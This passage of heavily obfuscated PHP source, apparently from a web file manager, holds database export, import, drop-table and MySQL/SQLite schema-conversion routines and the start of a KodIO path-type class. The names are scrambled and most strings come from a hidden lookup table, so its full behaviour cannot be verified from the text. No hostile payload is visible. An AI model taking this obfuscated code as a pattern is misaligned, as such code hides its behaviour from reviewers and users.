sqlSplit(IO::getContent($°¹‰œÏ)); foreach ($è¬¢“Ùâ as $ŸùÏÍçˆ) { $—ëéšö¼ = stripos($ŸùÏÍçˆ, $’Ó÷ÒÖ[1136]) === 0; if ($—ëéšö¼) { $ñ®ÎŞÎ¸->task[$’Ó÷ÒÖ[1137]] += 1; } $©¢¿¤‹->execute($ŸùÏÍçˆ); if ($—ëéšö¼) { preg_match($’Ó÷ÒÖ[1138], $ŸùÏÍçˆ, $ÍŞÇˆ…¤); $ñ®ÎŞÎ¸->task[$’Ó÷ÒÖ[1139]] = $ÍŞÇˆ…¤[1]; $ñ®ÎŞÎ¸->update(1); } } } public function insertTable($ü–å´–Ê, &$ÕÔıà×) { $ş¬ÍÔ¹ =& $_SERVER[Ş­ğŠìÒ]; $‹éåé² = $this->model()->db(); $ü¯×Æ¼ = $‘ú¯ÓÌğ ? array($‘ú¯ÓÌğ) : $‹éåé²->getTables(); foreach ($ü–å´–Ê as $ÎØ·×Ş®) { $‘ú¯ÓÌğ = basename($ÎØ·×Ş®, $ş¬ÍÔ¹[855]); if (!in_array($‘ú¯ÓÌğ, $ü¯×Æ¼)) { continue; } $ÕÔıà×->task[$ş¬ÍÔ¹[1139]] = $‘ú¯ÓÌğ; if (get_filesize($ÎØ·×Ş®) == 0) { continue; } $Çş÷§…å = $this->sqlToDb($ÎØ·×Ş®, $ÕÔıà×); if (!$Çş÷§…å) { ActionCall($ş¬ÍÔ¹[1134], !0, 0); show_json(LNG($ş¬ÍÔ¹[1140]) . "\133{$‘ú¯ÓÌğ}\x5d", !1); } } } public function sqlFromDb($ëæâ§ÍÓ, $¬‹íŞàÔ, &$—İ­´Æí, $¹şø½¥» = '') { if ($—İ­´Æí) { $—İ­´Æí->task[$_SERVER[Ş­ğŠìÒ][1139]] = $ëæâ§ÍÓ; } $å¦¼¨Á– = $this->model($ëæâ§ÍÓ); $ªË÷õ›´ = 0; $Ò—«¢Ê  = 0; $´Í¿ßì¶ = 10000; $ë¢§­Æ = fopen($¬‹íŞàÔ, $_SERVER[Ş­ğŠìÒ][1141]); $ûê’ËÙ¡ = $å¦¼¨Á–->getPk(); $à¤¬ë¯Ğ = $å¦¼¨Á–->getDbFields(); $ğğ‘üÒ = $_SERVER[Ş­ğŠìÒ][12]; if ($GLOBALS[$_SERVER[Ş­ğŠìÒ][854]] && in_array($ëæâ§ÍÓ, array($_SERVER[Ş­ğŠìÒ][1142], $_SERVER[Ş­ğŠìÒ][1143]))) { $ğğ‘üÒ = $ëæâ§ÍÓ; } do { $³Ş¬éÀ÷ = array($ûê’ËÙ¡ => array($_SERVER[Ş­ğŠìÒ][1088], $Ò—«¢Ê )); $åš³®¯¤ = $å¦¼¨Á–->where($³Ş¬éÀ÷)->field($à¤¬ë¯Ğ)->order($ûê’ËÙ¡ . $_SERVER[Ş­ğŠìÒ][1144])->limit($´Í¿ßì¶)->select(); $åš³®¯¤ = !empty($åš³®¯¤) ? $åš³®¯¤ : array(); if (!($·¬’±×à = count($åš³®¯¤))) { break; } $±Ë•÷ û = end($åš³®¯¤); $Ò—«¢Ê  = $±Ë•÷ û[$ûê’ËÙ¡]; $¬ª¾§Ï = array(); foreach ($åš³®¯¤ as $î œ·) { if ($ğğ‘üÒ) { if ($ëæâ§ÍÓ == $_SERVER[Ş­ğŠìÒ][1142]) { if ($î œ·[$_SERVER[Ş­ğŠìÒ][33]] == $_SERVER[Ş­ğŠìÒ][1145]) { $é®¥ÛìÑ = json_decode($î œ·[$_SERVER[Ş­ğŠìÒ][450]], !0); if ($é®¥ÛìÑ[$_SERVER[Ş­ğŠìÒ][32]] == $GLOBALS[$_SERVER[Ş­ğŠìÒ][854]] && $é®¥ÛìÑ[$_SERVER[Ş­ğŠìÒ][817]] != 1) { continue; } } } else { if ($î œ·[$_SERVER[Ş­ğŠìÒ][33]] == $_SERVER[Ş­ğŠìÒ][1146] && $î œ·[$_SERVER[Ş­ğŠìÒ][97]] == $_SERVER[Ş­ğŠìÒ][849]) { continue; } } } if ($¹şø½¥») { $î œ·[$_SERVER[Ş­ğŠìÒ][87]] = "\x7b\x69\157\x3a{$¹şø½¥»}\x7d" . substr($î œ·[$_SERVER[Ş­ğŠìÒ][87]], strlen("\x7b\151\x6f\x3a{$î œ·[$_SERVER[Ş­ğŠìÒ][884]]}\175")); $î œ·[$_SERVER[Ş­ğŠìÒ][884]] = $¹şø½¥»; } $¬ª¾§Ï[] = $_SERVER[Ş­ğŠìÒ][1147] . $this->sqlEncode($î œ·) . $_SERVER[Ş­ğŠìÒ][1148]; } $¦“›×­Ï = "\x49\x4e\123\105\x52\124\x20\111\x4e\124\117\x20\140{$ëæâ§ÍÓ}\x60\40\x28\140" . implode($_SERVER[Ş­ğŠìÒ][1149], $à¤¬ë¯Ğ) . $_SERVER[Ş­ğŠìÒ][1150]; fwrite($ë¢§­Æ, $¦“›×­Ï . implode($_SERVER[Ş­ğŠìÒ][1151], $¬ª¾§Ï) . $_SERVER[Ş­ğŠìÒ][74] . PHP_EOL); $ªË÷õ›´ += $·¬’±×à; if ($—İ­´Æí) { $—İ­´Æí->update($·¬’±×à); } } while ($´Í¿ßì¶ == $·¬’±×à); fclose($ë¢§­Æ); return $ªË÷õ›´; } public function sqlToDb($ùÊ½Ê’á, &$ûµßçÚ˜) { $°İêıĞà =& $_SERVER[Ş­ğŠìÒ]; $­©ƒ—Ç¹ = $this->model()->db(); $ª£ÙÛíŸ = @fopen($ùÊ½Ê’á, $°İêıĞà[1152]); if (!$ª£ÙÛíŸ) { return !1; } $²îÈÔµ = 0; $ÂãË–Å£ = $°İêıĞà[12]; $ç§‘ûñŞ = array(); $å­ãòû = $this->dbType(); $”Şí¶İß = $å­ãòû == $°İêıĞà[13] ? 500 : 2000; $´ò¢õÔ = basename($ùÊ½Ê’á, $°İêıĞà[855]); $ç±ÆÌ£ı = 0; $ô÷¸·üÜ = 4194304; while (!feof($ª£ÙÛíŸ)) { $ş“ûñØš = trim(fgets($ª£ÙÛíŸ)); if (!$ş“ûñØš) { continue; } $›ÓÔæŒÓ = $this->sqlDecode($ş“ûñØš, $å­ãòû, $´ò¢õÔ); if (stripos($›ÓÔæŒÓ, $°İêıĞà[431]) === 0) { if (!$ÂãË–Å£) { $ÂãË–Å£ = $›ÓÔæŒÓ . $°İêıĞà[53]; } continue; } if ($ûµßçÚ˜) { $ûµßçÚ˜->task[$°İêıĞà[1137]] += 1; } $²îÈÔµ++; $ç§‘ûñŞ[] = rtrim(rtrim(trim($›ÓÔæŒÓ), $°İêıĞà[50]), $°İêıĞà[74]); $Ğ­…ûï´ = null; $†Ø¶¸‹“ = strlen($›ÓÔæŒÓ); $ç±ÆÌ£ı += $†Ø¶¸‹“; $®Ååàí = strlen($ÂãË–Å£) + $ç±ÆÌ£ı + (count($ç§‘ûñŞ) - 1); if ($®Ååàí >= $ô÷¸·üÜ) { $Ğ­…ûï´ = array_pop($ç§‘ûñŞ); if ($²îÈÔµ > 1) { $²îÈÔµ--; } } if ($²îÈÔµ >= $”Şí¶İß || $Ğ­…ûï´) { $›ÓÔæŒÓ = $ÂãË–Å£ . implode($°İêıĞà[50], $ç§‘ûñŞ); if (!$­©ƒ—Ç¹->execute($›ÓÔæŒÓ)) { return !1; } if ($ûµßçÚ˜) { $ûµßçÚ˜->update($²îÈÔµ); } $ç§‘ûñŞ = array(); $²îÈÔµ = 0; $ç±ÆÌ£ı = 0; if ($Ğ­…ûï´) { $ç§‘ûñŞ = array($Ğ­…ûï´); $²îÈÔµ = 1; $ç±ÆÌ£ı = $†Ø¶¸‹“; } } } fclose($ª£ÙÛíŸ); if (!empty($ç§‘ûñŞ)) { $›ÓÔæŒÓ = $ÂãË–Å£ . implode($°İêıĞà[50], $ç§‘ûñŞ); if (!$­©ƒ—Ç¹->execute($›ÓÔæŒÓ)) { return !1; } if ($ûµßçÚ˜) { $ûµßçÚ˜->update($²îÈÔµ); } } return !0; } public function dropTable($û“‚àæ = null) { $ç‡ÆŞÃû = $this->model()->db(); $õµşô¡ = $û“‚àæ ? array($û“‚àæ) : $ç‡ÆŞÃû->getTables(); if (!$õµşô¡) { return; } foreach ($õµşô¡ as $û“‚àæ) { if ($û“‚àæ) { $û“‚àæ = strtolower($û“‚àæ); } else { continue; } $ç‡ÆŞÃû->execute("\144\x72\x6f\x70\x20\x74\x61\x62\x6c\145\40\x69\146\x20\x65\x78\151\163\164\163\x20\x60{$û“‚àæ}\x60"); } } private function sqlEncode($¸­ç¸¿Ï) { $ºÈæôšä =& $_SERVER[Ş­ğŠìÒ]; $ãÑĞş€Ê = array(); foreach ($¸­ç¸¿Ï as $Å³ê¶—Ş) { if (is_array($Å³ê¶—Ş)) { $Å³ê¶—Ş = json_encode_force($Å³ê¶—Ş); } $Å³ê¶—Ş = addslashes($Å³ê¶—Ş); $Å³ê¶—Ş = str_replace(array($ºÈæôšä[1153], $ºÈæôšä[262], $ºÈæôšä[418]), array($ºÈæôšä[1154], $ºÈæôšä[1155], $ºÈæôšä[1156]), $Å³ê¶—Ş); $ãÑĞş€Ê[] = $Å³ê¶—Ş; } return $ºÈæôšä[58] . implode($ºÈæôšä[1157], $ãÑĞş€Ê) . $ºÈæôšä[58]; } private function sqlDecode($¤ãøŸ¸õ, $ØöÄ‹ÀÉ, $Ùß·íç· = '') { $é£•¾´Ò =& $_SERVER[Ş­ğŠìÒ]; $¤ãøŸ¸õ = str_replace(array($é£•¾´Ò[1154], $é£•¾´Ò[1155], $é£•¾´Ò[1156]), array($é£•¾´Ò[1153], $é£•¾´Ò[262], $é£•¾´Ò[418]), $¤ãøŸ¸õ); if ($ØöÄ‹ÀÉ == $é£•¾´Ò[13]) { $¤ãøŸ¸õ = str_ireplace($é£•¾´Ò[1158], $é£•¾´Ò[59], $¤ãøŸ¸õ); $¤ãøŸ¸õ = stripslashes($¤ãøŸ¸õ); } return preg_replace($é£•¾´Ò[1159], $é£•¾´Ò[12], $¤ãøŸ¸õ); if ($ØöÄ‹ÀÉ == $é£•¾´Ò[13]) { return $Ùß·íç· != $é£•¾´Ò[1160] ? stripslashes($¤ãøŸ¸õ) : $¤ãøŸ¸õ; } if ($Ùß·íç· == $é£•¾´Ò[1160]) { $¤ãøŸ¸õ = str_replace($é£•¾´Ò[1161], $é£•¾´Ò[121], stripslashes($¤ãøŸ¸õ)); } return $¤ãøŸ¸õ; } public function getSqlFile($¾¡ ¤¼ = '') { $ˆ”®×¾ñ =& $_SERVER[Ş­ğŠìÒ]; $ù¾ÖåÒ“ = $this->dbType(!0); $›€‘´‹ = CONTROLLER_DIR . "\x69\x6e\x73\164\141\x6c\154\x2f\x64\141\x74\x61\57{$ù¾ÖåÒ“}\x2e\163\161\x6c"; $™à¦ÜÍª = file_get_contents($›€‘´‹); $œŸ™»ÌŠ = $ˆ”®×¾ñ[1162] . ($ù¾ÖåÒ“ == $ˆ”®×¾ñ[871] ? $ˆ”®×¾ñ[1163] : $ˆ”®×¾ñ[1164]) . $ˆ”®×¾ñ[1165]; preg_match_all($œŸ™»ÌŠ, $™à¦ÜÍª, $¯Î§õó); $ÓßÎÎ€ç = $¯Î§õó[1]; $ì’ôàÈŠ = $this->model()->db(); $ï’ß¡øœ = $ì’ôàÈŠ->getTables(); $ˆ°ä½Œ¤ = TEMP_FILES . $ˆ”®×¾ñ[1166] . date($ˆ”®×¾ñ[272]) . $ˆ”®×¾ñ[8]; del_dir($ˆ°ä½Œ¤); mk_dir($ˆ°ä½Œ¤); $‚èÉŠ„ = $ˆ°ä½Œ¤ . $ˆ”®×¾ñ[1167]; $äÎÓÊ¯… = $ˆ°ä½Œ¤ . $ˆ”®×¾ñ[1168]; $ì˜˜Š¯ = $ù¾ÖåÒ“ == $ˆ”®×¾ñ[13] ? $ˆ”®×¾ñ[871] : $ˆ”®×¾ñ[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\164\141\x6c\154\57\x64\141\x74\x61\57{$ì˜˜Š¯}\x2e\x73\161\x6c", $ˆ°ä½Œ¤); @touch($ˆ°ä½Œ¤ . $ù¾ÖåÒ“ . $ˆ”®×¾ñ[855]); $Ú„˜ö«› = fopen($‚èÉŠ„, $ˆ”®×¾ñ[1141]); $Ç¯ÌƒÙ¾ = fopen($äÎÓÊ¯…, $ˆ”®×¾ñ[1141]); if ($ù¾ÖåÒ“ == $ˆ”®×¾ñ[13]) { $ï’ß¡øœ = array_diff($ï’ß¡øœ, array($ˆ”®×¾ñ[847], $ˆ”®×¾ñ[848])); $çõê°®œ = array($ˆ”®×¾ñ[1169], $ˆ”®×¾ñ[1170], $ˆ”®×¾ñ[1171]); fwrite($Ç¯ÌƒÙ¾, implode(PHP_EOL, $çõê°®œ) . PHP_EOL . PHP_EOL); foreach ($ï’ß¡øœ as $¹Å×À¤ì) { $ãÂû™«“ = $this->sqlFromSqlite($¹Å×À¤ì); if (!$ãÂû™«“[$ˆ”®×¾ñ[13]]) { continue; } fwrite($Ç¯ÌƒÙ¾, $ãÂû™«“[$ˆ”®×¾ñ[13]] . PHP_EOL . PHP_EOL); if (!in_array($¹Å×À¤ì, $ÓßÎÎ€ç)) { fwrite($Ú„˜ö«›, $ãÂû™«“[$ˆ”®×¾ñ[871]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ï’ß¡øœ as $¹Å×À¤ì) { $ãÂû™«“ = $this->sqlFromMysql($¹Å×À¤ì); if (!$ãÂû™«“[$ˆ”®×¾ñ[871]]) { continue; } fwrite($Ú„˜ö«›, $ãÂû™«“[$ˆ”®×¾ñ[871]] . PHP_EOL . PHP_EOL); if (!in_array($¹Å×À¤ì, $ÓßÎÎ€ç)) { fwrite($Ç¯ÌƒÙ¾, $ãÂû™«“[$ˆ”®×¾ñ[13]] . PHP_EOL . PHP_EOL); } } } fclose($Ú„˜ö«›); fclose($Ç¯ÌƒÙ¾); $™à¦ÜÍª = array($ˆ”®×¾ñ[871] => $‚èÉŠ„, $ˆ”®×¾ñ[13] => $äÎÓÊ¯…); return $¾¡ ¤¼ ? $™à¦ÜÍª[$¾¡ ¤¼] : $™à¦ÜÍª; } public function dbType($¾é“Ñ©Á = false) { $ÍÁŞÎ“ =& $_SERVER[Ş­ğŠìÒ]; $Ø³íˆ¨ = $¾é“Ñ©Á ? $GLOBALS[$ÍÁŞÎ“[6]][$ÍÁŞÎ“[21]] : $this->database; $Ø³íˆ¨ = array_change_key_case($Ø³íˆ¨); $ä·’ÒÙÕ = $Ø³íˆ¨[$ÍÁŞÎ“[1041]]; if ($ä·’ÒÙÕ == $ÍÁŞÎ“[1038]) { $ù–†£ÇÁ = explode($ÍÁŞÎ“[4], $Ø³íˆ¨[$ÍÁŞÎ“[1047]]); $ä·’ÒÙÕ = $ù–†£ÇÁ[0]; } $è´×ÄÂÈ = array($ÍÁŞÎ“[1172] => $ÍÁŞÎ“[13], $ÍÁŞÎ“[986] => $ÍÁŞÎ“[871]); if (isset($è´×ÄÂÈ[$ä·’ÒÙÕ])) { $ä·’ÒÙÕ = $è´×ÄÂÈ[$ä·’ÒÙÕ]; } return $ä·’ÒÙÕ; } public function sqlFromMysql($êîšÊÈ¯, $ıö—¥ò… = '') { $Ê‡Ô‘ö =& $_SERVER[Ş­ğŠìÒ]; $´İî°Ë‹ = $this->model()->db(); $âØ¿’Å = $´İî°Ë‹->query($Ê‡Ô‘ö[1173] . $êîšÊÈ¯ . $Ê‡Ô‘ö[461]); if (!$âØ¿’Å || !$âØ¿’Å[0]) { return !1; } $Â·¿‰Ÿ× = _get($âØ¿’Å[0], $Ê‡Ô‘ö[1174], $Ê‡Ô‘ö[12]); if (!$Â·¿‰Ÿ×) { return !1; } $€¾İµüê = "\x44\122\117\120\x20\124\101\102\x4c\105\x20\x49\x46\x20\x45\x58\111\x53\x54\123\40\140{$êîšÊÈ¯}\140\73" . PHP_EOL . $Â·¿‰Ÿ× . $Ê‡Ô‘ö[74]; if ($ıö—¥ò… && $ıö—¥ò… == $Ê‡Ô‘ö[871]) { return $€¾İµüê; } $˜ÍššÄÛ = array_change_key_case($GLOBALS[$Ê‡Ô‘ö[6]][$Ê‡Ô‘ö[21]]); $ÅƒÉÊô = $˜ÍššÄÛ[$Ê‡Ô‘ö[1046]]; $˜Ò©ÂÉÅ = $Ê‡Ô‘ö[1175] . $ÅƒÉÊô . $Ê‡Ô‘ö[1176] . $êîšÊÈ¯ . $Ê‡Ô‘ö[58]; $Ê±õœ¤Ü = $Ê‡Ô‘ö[1177] . $êîšÊÈ¯ . $Ê‡Ô‘ö[974]; $ù³ò§æ = $´İî°Ë‹->query($˜Ò©ÂÉÅ); if (empty($ù³ò§æ)) { $Ëäßîâº = array($Ê‡Ô‘ö[871] => $Ê‡Ô‘ö[12], $Ê‡Ô‘ö[13] => $Ê‡Ô‘ö[12]); return $ıö—¥ò… ? $Ëäßîâº[$ıö—¥ò…] : $Ëäßîâº; } $È¾Å·¼´ = $´İî°Ë‹->query($Ê±õœ¤Ü); $¼º¢Õâ» = $Ê‡Ô‘ö[12]; $¸¡ş½îµ = array(); foreach ($È¾Å·¼´ as $Îı­ª§) { if (!$¼º¢Õâ» && $Îı­ª§[$Ê‡Ô‘ö[1178]] == $Ê‡Ô‘ö[1179]) { $¼º¢Õâ» = $Îı­ª§[$Ê‡Ô‘ö[1180]]; } if (isset($¸¡ş½îµ[$Îı­ª§[$Ê‡Ô‘ö[1178]]])) { $¸¡ş½îµ[$Îı­ª§[$Ê‡Ô‘ö[1178]]][$Ê‡Ô‘ö[1181]][] = $Îı­ª§[$Ê‡Ô‘ö[1180]]; continue; } $¸¡ş½îµ[$Îı­ª§[$Ê‡Ô‘ö[1178]]] = array($Ê‡Ô‘ö[1182] => $Îı­ª§[$Ê‡Ô‘ö[1178]], $Ê‡Ô‘ö[1181] => array($Îı­ª§[$Ê‡Ô‘ö[1180]]), $Ê‡Ô‘ö[1183] => $Îı­ª§[$Ê‡Ô‘ö[1184]] == $Ê‡Ô‘ö[91] ? 0 : 1); } $®ó«ÇŒò = array(); foreach ($¸¡ş½îµ as $Îı­ª§) { $’Æ •± = $Îı­ª§[$Ê‡Ô‘ö[1182]] == $Ê‡Ô‘ö[1179]; $”¤Å×­ = array($Ê‡Ô‘ö[1185], $Îı­ª§[$Ê‡Ô‘ö[1183]] == $Ê‡Ô‘ö[91] && !$’Æ •± ? $Ê‡Ô‘ö[1186] : $Ê‡Ô‘ö[12], $Ê‡Ô‘ö[1187], $Ê‡Ô‘ö[1188] . $êîšÊÈ¯ . $Ê‡Ô‘ö[11] . ($’Æ •± ? $Ê‡Ô‘ö[1189] : $Îı­ª§[$Ê‡Ô‘ö[1182]]) . $Ê‡Ô‘ö[121], $Ê‡Ô‘ö[1190], $Ê‡Ô‘ö[121] . $êîšÊÈ¯ . $Ê‡Ô‘ö[121], $Ê‡Ô‘ö[1191] . implode($Ê‡Ô‘ö[1192], $Îı­ª§[$Ê‡Ô‘ö[1181]]) . $Ê‡Ô‘ö[1193]); $®ó«ÇŒò[] = implode($Ê‡Ô‘ö[53], $”¤Å×­) . $Ê‡Ô‘ö[74]; } $÷´Á¶ìğ = array(); $¾¯úà¢± = array($Ê‡Ô‘ö[1194] => $Ê‡Ô‘ö[1195], $Ê‡Ô‘ö[1195] => $Ê‡Ô‘ö[1195], $Ê‡Ô‘ö[364] => $Ê‡Ô‘ö[391], $Ê‡Ô‘ö[363] => $Ê‡Ô‘ö[391]); foreach ($ù³ò§æ as $Îı­ª§) { $”¤Å×­ = array($Ê‡Ô‘ö[121] . $Îı­ª§[$Ê‡Ô‘ö[1196]] . $Ê‡Ô‘ö[121], isset($¾¯úà¢±[$Îı­ª§[$Ê‡Ô‘ö[1197]]]) ? $¾¯úà¢±[$Îı­ª§[$Ê‡Ô‘ö[1197]]] : $Îı­ª§[$Ê‡Ô‘ö[1198]], $Îı­ª§[$Ê‡Ô‘ö[1199]] == $Ê‡Ô‘ö[972] ? $Ê‡Ô‘ö[1200] : $Ê‡Ô‘ö[1201], $Îı­ª§[$Ê‡Ô‘ö[1196]] == $¼º¢Õâ» ? $Ê‡Ô‘ö[1202] : $Ê‡Ô‘ö[12], $Îı­ª§[$Ê‡Ô‘ö[1023]] ? strtoupper(str_replace($Ê‡Ô‘ö[11], $Ê‡Ô‘ö[12], $Îı­ª§[$Ê‡Ô‘ö[1023]])) : $Ê‡Ô‘ö[12]); $÷´Á¶ìğ[] = trim(implode($Ê‡Ô‘ö[53], $”¤Å×­)); } $›ùû²Ÿ¿ = array($Ê‡Ô‘ö[1203] . $êîšÊÈ¯ . $Ê‡Ô‘ö[1204], $Ê‡Ô‘ö[1205] . $êîšÊÈ¯ . $Ê‡Ô‘ö[1206], implode($Ê‡Ô‘ö[50] . PHP_EOL, $÷´Á¶ìğ), $Ê‡Ô‘ö[1020]); $Ğµèğ = implode(PHP_EOL, array_merge($›ùû²Ÿ¿, $®ó«ÇŒò)); if ($ıö—¥ò… && $ıö—¥ò… == $Ê‡Ô‘ö[13]) { return $Ğµèğ; } $Ëäßîâº = array($Ê‡Ô‘ö[871] => $€¾İµüê, $Ê‡Ô‘ö[13] => $Ğµèğ); return $ıö—¥ò… ? $Ëäßîâº[$ıö—¥ò…] : $Ëäßîâº; } public function sqlFromSqlite($×ê°­Õ, $Ë¬±ª³ = '') { $Ä†ù¬¦´ =& $_SERVER[Ş­ğŠìÒ]; $ìß‘¥Û° = $this->model()->db(); $ñˆõù€û = "\x50\122\x41\107\115\101\x20\124\x41\x42\114\105\137\x49\x4e\106\x4f\40\x28\x27{$×ê°­Õ}\x27\51"; $¼†ıÜ…î = "\123\x45\114\105\103\x54\x20\52\40\x46\x52\117\x4d\40\x73\x71\x6c\x69\164\x65\137\155\x61\x73\x74\145\x72\40\127\110\105\122\105\x20\164\x62\154\x5f\156\141\155\x65\40\x3d\40\x27{$×ê°­Õ}\47"; $¬¡ıÎÛ¶ = $ìß‘¥Û°->query($ñˆõù€û); if (empty($¬¡ıÎÛ¶)) { $¶Ë›¹Ëö = array($Ä†ù¬¦´[871] => $Ä†ù¬¦´[12], $Ä†ù¬¦´[13] => $Ä†ù¬¦´[12]); return $Ë¬±ª³ ? $¶Ë›¹Ëö[$Ë¬±ª³] : $¶Ë›¹Ëö; } $””ã¨ÈÂ = $ìß‘¥Û°->query($¼†ıÜ…î); $€“º±´³ = $üªå’ê› = array(); foreach ($””ã¨ÈÂ as $úÍîÑäù) { if ($úÍîÑäù[$Ä†ù¬¦´[33]] == $Ä†ù¬¦´[356]) { $€“º±´³[] = $úÍîÑäù[$Ä†ù¬¦´[1207]]; } else { $üªå’ê›[$úÍîÑäù[$Ä†ù¬¦´[32]]] = $úÍîÑäù[$Ä†ù¬¦´[1207]]; } } $–Ú£šºô = array_merge(array($Ä†ù¬¦´[1203] . $×ê°­Õ . $Ä†ù¬¦´[121]), $€“º±´³, array_values($üªå’ê›)); $–Ú£šºô = implode($Ä†ù¬¦´[74] . PHP_EOL, $–Ú£šºô) . $Ä†ù¬¦´[74]; if ($Ë¬±ª³ && $Ë¬±ª³ == $Ä†ù¬¦´[13]) { return $–Ú£šºô; } $²ïİ±¤¯ = array(); $“ÓíÁÎ¬ = array($Ä†ù¬¦´[1195] => $Ä†ù¬¦´[1208], $Ä†ù¬¦´[391] => $Ä†ù¬¦´[1209]); $ŞíËñˆÍ = $Ä†ù¬¦´[12]; foreach ($¬¡ıÎÛ¶ as $úÍîÑäù) { if ($úÍîÑäù[$Ä†ù¬¦´[57]] == $Ä†ù¬¦´[91]) { $ŞíËñˆÍ = $úÍîÑäù[$Ä†ù¬¦´[32]]; } $å¶˜¡ × = array($Ä†ù¬¦´[461] . $úÍîÑäù[$Ä†ù¬¦´[32]] . $Ä†ù¬¦´[461], isset($“ÓíÁÎ¬[$úÍîÑäù[$Ä†ù¬¦´[33]]]) ? $“ÓíÁÎ¬[$úÍîÑäù[$Ä†ù¬¦´[33]]] : $úÍîÑäù[$Ä†ù¬¦´[33]], $úÍîÑäù[$Ä†ù¬¦´[35]] == $Ä†ù¬¦´[91] ? $Ä†ù¬¦´[1200] : $Ä†ù¬¦´[1210] . $úÍîÑäù[$Ä†ù¬¦´[56]], $úÍîÑäù[$Ä†ù¬¦´[57]] == $Ä†ù¬¦´[91] ? $Ä†ù¬¦´[1211] : $Ä†ù¬¦´[12]); $²ïİ±¤¯[] = trim(implode($Ä†ù¬¦´[53], $å¶˜¡ ×)); } foreach ($üªå’ê› as $ä›İüœˆ => $Ò·‡ñ¾‰) { $ùºãµæÑ = str_replace($Ä†ù¬¦´[1212] . $×ê°­Õ . $Ä†ù¬¦´[11], $Ä†ù¬¦´[12], $ä›İüœˆ); $“Ç¬©—™ = str_replace(array($Ä†ù¬¦´[121], $Ä†ù¬¦´[1031]), $Ä†ù¬¦´[461], substr($Ò·‡ñ¾‰, stripos($Ò·‡ñ¾‰, $Ä†ù¬¦´[337]))); if ($ùºãµæÑ == $Ä†ù¬¦´[1189]) { $–£Äæõ = $Ä†ù¬¦´[1213] . $ŞíËñˆÍ . $Ä†ù¬¦´[1214]; } else { $–£Äæõ = (stripos($ùºãµæÑ, $Ä†ù¬¦´[11]) ? $Ä†ù¬¦´[1215] : $Ä†ù¬¦´[12]) . ($Ä†ù¬¦´[1216] . $ùºãµæÑ . $Ä†ù¬¦´[1217] . $“Ç¬©—™); } $²ïİ±¤¯[] = $–£Äæõ; } $©¨¯Öí‡ = array($Ä†ù¬¦´[1218] . $×ê°­Õ . $Ä†ù¬¦´[1219], $Ä†ù¬¦´[1220] . $×ê°­Õ . $Ä†ù¬¦´[1221], implode($Ä†ù¬¦´[50] . PHP_EOL, $²ïİ±¤¯), $Ä†ù¬¦´[1222]); $ñÅúÆ¸å = implode(PHP_EOL, $©¨¯Öí‡); if ($Ë¬±ª³ && $Ë¬±ª³ == $Ä†ù¬¦´[871]) { return $ñÅúÆ¸å; } $¶Ë›¹Ëö = array($Ä†ù¬¦´[871] => $ñÅúÆ¸å, $Ä†ù¬¦´[13] => $–Ú£šºô); return $Ë¬±ª³ ? $¶Ë›¹Ëö[$Ë¬±ª³] : $¶Ë›¹Ëö; } } goto bÎÂ†·É·; aµ·ä”ò‡: class KodIO { const KOD_SOURCE = "\x7b\163\157\165\x72\x63\x65\175"; const KOD_USER_RECYCLE = "\173\165\163\145\162\x52\145\x63\x79\143\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\165\x73\145\x72\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\163\145\x72\106\151\x6c\145\x54\141\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\106\151\x6c\x65\124\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\165\x70\x52\157\x6f\164\123\145\x6c\146\x7d"; const KOD_USER_SHARE = "\173\165\163\x65\162\123\x68\141\162\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\162\x53\150\141\x72\145\x4c\151\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\162\x65\x54\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\162\x65\x49\164\145\x6d\175"; const KOD_SHARE_LINK = "\173\163\x68\141\162\145\x49\164\x65\155\x4c\151\x6e\153\175"; const KOD_SEARCH = "\x7b\x73\x65\141\162\143\150\175"; const KOD_BLOCK = "\x7b\x62\x6c\x6f\x63\x6b\175"; const KOD_IO = "\x7b\151\157\x7d"; const KOD_USER_RECENT = "\173\x75\x73\145\x72\122\145\x6e\x63\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\173\x64\x72\151\x76\x65\162\175"; public static function typeList() { $šüÙ•Ù =& $_SERVER[Ş­ğŠìÒ]; return array($šüÙ•Ù[1332] => self::KOD_SOURCE, $šüÙ•Ù[1333] => self::KOD_USER_RECYCLE, $šüÙ•Ù[1334] => self::KOD_USER_FAV, $šüÙ•Ù[1335] => self::KOD_USER_FILE_TAG, $šüÙ•Ù[1336] => self::KOD_USER_FILE_TYPE, $šüÙ•Ù[1337] => self::KOD_GROUP_ROOT_SELF, $šüÙ•Ù[1338] => self::KOD_USER_SHARE, $šüÙ•Ù[1339] => self::KOD_USER_SHARE_LINK, $šüÙ•Ù[1340] => self::KOD_USER_SHARE_TO_ME, $šüÙ•Ù[1341] => self::KOD_SHARE_ITEM, $šüÙ•Ù[1342] => self::KOD_SHARE_LINK, $šüÙ•Ù[1343] => self::KOD_SEARCH, $šüÙ•Ù[1344] => self::KOD_BLOCK, $šüÙ•Ù[1345] => self::KOD_IO, $šüÙ•Ù[1346] => self::KOD_USER_RECENT, $šüÙ•Ù[1347] => self::KOD_USER_DRIVER); } public static function parse($×ªğ’³Û) { $«‰¼ÓÇ» =& $_SERVER[Ş­ğŠìÒ]; $×ªğ’³Û = self::clear($×ªğ’³Û); $½Ì¥Ğó´ = array_values(self::typeList()); preg_match($«‰¼ÓÇ»[1348], $×ªğ’³Û, $áÅ«•Œ°); $íÖ¶î— = array($«‰¼ÓÇ»[496] => !1, $«‰¼ÓÇ»[1349] => !1, $«‰¼ÓÇ»[493] => !1, $«‰¼ÓÇ»[87] => $×ªğ’³Û, $«‰¼ÓÇ»[1247] => !1, $«‰¼ÓÇ»[1246] => $«‰¼ÓÇ»[12]); if (is_array($áÅ«•Œ°) && count($áÅ«•Œ°) == 5) { $ÄƒÎ¸ó‰ = $«‰¼ÓÇ»[1350] . $áÅ«•Œ°[2] . $«‰¼ÓÇ»[403]; if (in_array($ÄƒÎ¸ó‰, $½Ì¥Ğó´)) { $íÖ¶î—[$«‰¼ÓÇ»[1247]] = $áÅ«•Œ°[1]; $íÖ¶î—[$«‰¼ÓÇ»[33]] = 